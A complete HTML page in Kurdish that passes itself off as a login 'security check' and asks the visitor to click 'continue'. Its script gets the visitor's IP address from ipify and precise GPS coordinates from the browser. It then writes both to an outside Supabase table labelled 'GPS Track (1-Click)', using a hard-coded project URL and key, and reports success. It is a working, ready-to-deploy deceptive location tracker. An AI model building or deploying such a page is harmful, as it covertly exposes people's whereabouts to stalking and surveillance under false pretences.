<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>داواکاری چوونەژوورەوە</title>
  <style>
    body {
      background-color: #0f172a;
      color: #f8fafc;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .card {
      background: #1e293b;
      max-width: 380px;
      width: 100%;
      padding: 30px;
      border-radius: 16px;
      text-align: center;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    }
    button {
      background: #2563eb;
      color: white;
      border: none;
      padding: 14px 28px;
      font-size: 16px;
      font-weight: bold;
      border-radius: 10px;
      cursor: pointer;
      width: 100%;
      margin-top: 15px;
      transition: 0.2s;
    }
    button:hover {
      background: #1d4ed8;
    }
    #result {
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <div class="card">
    <h2>پشکنینی ئاسایش</h2>
    <p>تکایە کلیک لەسەر دوگمەی خوارەوە بکە بۆ بەردەوامبوون.</p>
    <button id="startBtn">بەردەوام بوون</button>
    <div id="result"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    async function getUserIP() {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        return data.ip;
      } catch (err) {
        return "Unknown IP";
      }
    }

    document.getElementById("startBtn").addEventListener("click", async function () {
      const resultDiv = document.getElementById("result");
      const btn = this;

      btn.disabled = true;
      resultDiv.innerHTML = "<span style='color:#3b82f6;'>⏳ دروستکردنی پەیوەندی...</span>";

      const userIP = await getUserIP();

      if (!navigator.geolocation) {
        resultDiv.innerHTML = "<span style='color:#ef4444;'>❌ GPS پشتیوانی ناکرێت.</span>";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async function (position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          try {
            await supabaseClient
              .from("locations")
              .insert([{
                name: "GPS Track (1-Click)",
                latitude: lat,
                longitude: lon,
                ip_address: userIP
              }]);

            resultDiv.innerHTML = "<span style='color:#22c55e; font-weight:bold;'>✅ پرۆسەکە بە سەرکەوتوویی تەواو بوو!</span>";
          } catch (err) {
            resultDiv.innerHTML = "<span style='color:#ef4444;'>⚠️ هەڵە لە تۆمارکردن.</span>";
          }
        },
        function (error) {
          resultDiv.innerHTML = "<span style='color:#ef4444;'>❌ ڕێگەپێدانی شوێن ڕەتکرایەوە.</span>";
          btn.disabled = false;
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  </script>

</body>
</html>
